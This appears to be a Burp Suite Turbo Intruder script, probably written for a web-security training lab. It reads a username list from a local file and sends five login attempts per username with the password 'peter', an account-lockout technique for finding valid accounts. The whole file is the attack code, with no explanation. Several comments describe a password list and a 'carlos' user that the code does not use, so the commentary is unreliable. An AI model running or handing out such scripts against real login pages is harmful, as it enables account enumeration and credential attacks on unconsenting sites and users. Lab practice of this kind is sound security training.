def queueRequests(target, wordlists):
    # Create a request engine with specific parameters
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,  # Set the number of concurrent connections
                           requestsPerConnection=1,  # Set the number of requests per connection
                           pipeline=False  # Disable HTTP pipelining
                           )

    # Read the user list from a file
    with open('/Users/duffy/Desktop/usernames.txt') as user_file:
        users = user_file.read().splitlines()

    # Iterate over the password list and send requests with the appropriate payloads
    counter = 0
    for user in users:
        engine.queue(target.req, 'username='+user+'&password=peter')
        engine.queue(target.req, 'username='+user+'&password=peter')
        engine.queue(target.req, 'username='+user+'&password=peter')
        engine.queue(target.req, 'username='+user+'&password=peter')
        engine.queue(target.req, 'username='+user+'&password=peter')
        
        # Send the request with the "carlos" username and the current password from the password list

def handleResponse(req, interesting):
    # If the response is interesting (e.g., based on status code, content, etc.), add it to the results table
    if interesting:
        table.add(req)
